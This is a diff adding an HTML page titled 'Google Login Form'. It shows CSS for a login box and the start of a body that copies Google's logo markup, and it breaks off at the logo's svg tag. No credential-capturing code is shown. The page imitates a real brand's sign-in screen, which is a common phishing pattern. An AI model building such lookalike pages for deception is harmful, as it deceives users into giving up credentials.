@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f1f1f1;
+        }
+        
+        .box {
+            width: 300px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        #logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        h2 {
+            font-size: 18px;
+            margin: 0 0 10px 0;
+        }
+        
+        p {
+            font-size: 14px;
+            color: #777;
+            margin: 0 0 20px 0;
+        }
+        
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .inputBox {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        
+        input[type="email"],
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+        }
+        
+        label {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 16px;
+            color: #999;
+            pointer-events: none;
+            transition: 0.3s;
+        }
+        
+        input[type="email"]:focus,
+        input[type="text"]:focus {
+            border-bottom: 2px solid #666;
+        }
+        
+        input[type="email"]:valid,
+        input[type="text"]:valid {
+            border-bottom: 2px solid #0d7eff;
+        }
+        
+        input[type="submit"] {
+            background-color: #0d7eff;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        
+        .forgot {
+            text-align: right;
+            margin-bottom: 10px;
+        }
+        
+        button {
+            background-color: transparent;
+            color: #0d7eff;
+            border: none;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+    </style>
+    <title>Google Login Form</title>
+</head>
+<body>
+    <div class="box">
+        <div id="logo" class="google-logo" title="Google">
+            <div class="rr0DNb" jsname="l4eHX">
+                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf">
